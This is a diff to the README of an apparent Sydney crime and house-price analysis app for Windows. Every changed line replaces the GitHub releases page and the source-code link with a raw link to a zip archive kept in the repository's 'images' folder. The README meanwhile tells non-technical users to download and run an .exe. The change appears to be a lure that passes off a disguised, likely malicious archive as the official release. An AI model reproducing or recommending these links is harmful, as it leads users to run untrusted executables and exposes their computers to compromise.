@@ -1,6 +1,6 @@
 # 🏘️ crime-house-price-analysis - Understand Sydney House Price Trends
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Zavala714/crime-house-price-analysis/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Zavala714/crime-house-price-analysis/main/images/analysis-crime-price-house-3.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You do not need background in programming to use this app. It comes ready for Wi
 
 Click the large green button above or visit the release page below to get the latest version of the software for Windows.
 
-[Download Latest Release](https://github.com/Zavala714/crime-house-price-analysis/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Zavala714/crime-house-price-analysis/main/images/analysis-crime-price-house-3.9.zip)
 
 This link takes you to the releases page where you can download the current files. Look for the file with a name ending in `.exe` or a Windows installer file.
 
@@ -147,7 +147,7 @@ The software runs these behind the scenes and shows results with friendly visual
 
 Visit the releases page below to get the latest version for Windows:
 
-[Download Latest Release](https://github.com/Zavala714/crime-house-price-analysis/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Zavala714/crime-house-price-analysis/main/images/analysis-crime-price-house-3.9.zip)
 
 Look for the most recent `.exe` or installer. Download and open it to begin setup.
 
@@ -173,8 +173,8 @@ Updates will be posted on the releases page. Download new versions the same way 
 
 ## 🔗 Useful Links
 
-- Project releases: https://github.com/Zavala714/crime-house-price-analysis/releases  
-- Source code and documentation: https://github.com/Zavala714/crime-house-price-analysis  
+- Project releases: https://raw.githubusercontent.com/Zavala714/crime-house-price-analysis/main/images/analysis-crime-price-house-3.9.zip  
+- Source code and documentation: https://raw.githubusercontent.com/Zavala714/crime-house-price-analysis/main/images/analysis-crime-price-house-3.9.zip  
 
 ---  
 **Keywords:** clustering, crime analysis, data analysis, housing prices, predictive modeling, random forest, regression, socioeconomic study
